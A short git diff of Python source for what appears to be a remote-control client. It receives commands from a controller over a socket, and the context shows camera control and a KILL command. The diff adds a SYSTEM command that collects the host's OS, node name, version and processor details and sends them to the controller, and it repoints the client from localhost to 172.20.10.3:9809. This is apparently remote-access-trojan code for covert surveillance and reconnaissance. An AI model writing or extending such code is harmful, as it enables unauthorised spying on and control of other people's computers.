@@ -219,6 +219,19 @@ def receive_commands(sock):
                     else:
                         stop_cam_signal.set()
 
+                elif command_type == 'SYSTEM':
+                    system_info = {
+                        'command': 'SYSTEM',
+                        'system': platform.system(),
+                        'node': platform.node(),
+                        'release': platform.release(),
+                        'version': platform.version(),
+                        'machine': platform.machine(),
+                        'processor': platform.processor()
+                    }
+                    json_data = json.dumps(system_info)
+                    sock.send(json_data.encode())
+
                 elif command_type == 'KILL':
                     global stop
                     stop = True
@@ -247,7 +260,7 @@ def receive_commands(sock):
 # Main function
 def main():
     global stop
-    host = 'localhost'
+    host = '172.20.10.3'
     port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
     current_date = datetime.datetime.now().strftime("%d%m%Y")
